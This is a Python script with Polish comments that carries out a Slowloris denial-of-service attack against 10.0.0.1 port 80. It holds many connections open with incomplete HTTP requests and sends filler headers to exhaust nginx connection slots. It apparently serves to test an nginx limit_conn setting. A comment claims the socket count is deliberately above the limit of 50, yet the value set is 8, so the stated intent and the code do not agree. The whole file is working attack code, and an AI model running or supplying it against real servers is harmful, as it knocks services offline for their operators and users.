#!/usr/bin/env python3

import socket
import random
import time
import sys

# Konfiguracja
TARGET_IP = "10.0.0.1"
PORT = 80
SOCKET_COUNT = 8  # Celowo więcej niż 50 (limit_conn w nginx.conf)
SLEEP_TIME = 5     # Czas między wysyłaniem kolejnych fragmentów (w sekundach)

sockets = []

def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((TARGET_IP, PORT))
        
        # Wysłanie niepełnego żądania HTTP (Brak końcowego \r\n)
        s.send(f"GET /?rand={random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {TARGET_IP}\r\n".encode("utf-8"))
        s.send("User-Agent: Slowloris-Testing-Script\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        return s
    except socket.error:
        return None

print(f"[*] Rozpoczynam atak Slowloris na {TARGET_IP}:{PORT}")
print(f"[*] Próba nawiązania {SOCKET_COUNT} jednoczesnych połączeń...")

# Inicjalizacja gniazd
for _ in range(SOCKET_COUNT):
    s = create_socket()
    if s:
        sockets.append(s)

print(f"[+] Udało się nawiązać {len(sockets)} połączeń. Rozpoczynam podtrzymywanie...")

try:
    while True:
        print(f"[*] Wysyłanie fałszywych nagłówków do {len(sockets)} otwartych gniazd...")
        
        for s in list(sockets):
            try:
                # Wysłanie bezsensownego nagłówka, aby Nginx nie zamknął połączenia z powodu timeoutu
                s.send(f"X-Keep-Alive: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except socket.error:
                # Gniazdo umarło (np. Nginx zerwał połączenie)
                sockets.remove(s)
        
        # Odtwarzanie utraconych połączeń, by utrzymać obciążenie
        for _ in range(SOCKET_COUNT - len(sockets)):
            s = create_socket()
            if s:
                sockets.append(s)
                
        time.sleep(SLEEP_TIME)

except KeyboardInterrupt:
    print("\n[*] Przerywam atak. Zamykam połączenia.")
    for s in sockets:
        s.close()
    sys.exit(0)
